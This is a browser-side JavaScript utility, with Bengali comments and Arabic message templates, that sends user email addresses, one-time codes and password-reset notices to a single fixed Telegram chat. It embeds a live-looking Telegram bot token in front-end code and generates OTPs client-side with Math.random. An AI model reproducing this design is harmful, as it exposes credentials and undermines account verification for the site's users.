// assets/js/telegram-utils.js
// টেলিগ্রাম কনফিগারেশন এবং ওটিপি জেনারেটর

const TELEGRAM_CONFIG = {
    token: "8157865533:AAFAbSTJorEfNzopk1AtpXKp1hlyhT3IM4U",
    chatId: "6367673550"
};

// টেলিগ্রামে মেসেজ পাঠানোর ফাংশন
window.sendTelegramMessage = async function(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendMessage`;
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });
        const data = await response.json();
        return data.ok;
    } catch (error) {
        console.error("Telegram Error:", error);
        return false;
    }
};

// ৬ সংখ্যার ওটিপি জেনারেটর
window.generateOTP = function() {
    return Math.floor(100000 + Math.random() * 900000).toString();
};

// নতুন যোগ: ইউজারকে টার্গেট করে OTP পাঠানো (প্রফেশনাল আরবি টেমপ্লেট + Copy বাটন)
window.sendOTPToTelegram = async function(email, otp) {
    const message = `<b>رمز التحقق</b>\n\n` +
                    `البريد الإلكتروني: ${email}\n\n` +
                    `رمز التحقق الخاص بك هو: <code>${otp}</code>\n\n` +
                    `صالح لمدة ٣ دقائق.\n\n` +
                    `لا تشارك هذا الرمز مع أي شخص.\n\n` +
                    `النظام تم إنشاؤه بواسطة: <b>سلطان</b> 🤗`;

    const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendMessage`;

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.chatId,
                text: message,
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [[
                       { text: "انقر على الأرقام الستة أعلاه لنسخ الرمز.", callback_data: "custom_button_pressed" }  // Copy বাটন: bot-এ হ্যান্ডলার লাগবে copied শো করার জন্য
                    ]]
                }
            })
        });
        const data = await response.json();
        return data.ok;
    } catch (error) {
        console.error("Telegram OTP Send Error:", error);
        return false;
    }
};

// নতুন যোগ: পাসওয়ার্ড রিসেট কনফার্মেশন (আরবিতে প্রফেশনাল)
window.sendPasswordResetConfirmation = async function(email) {
    const message = `✅ تم إعادة تعيين كلمة المرور بنجاح!\n\n` +
                   `📧 البريد الإلكتروني: ${email}\n` +
                   `🕒 الوقت: ${new Date().toLocaleString('ar-SA')}`;
    return await window.sendTelegramMessage(message);
};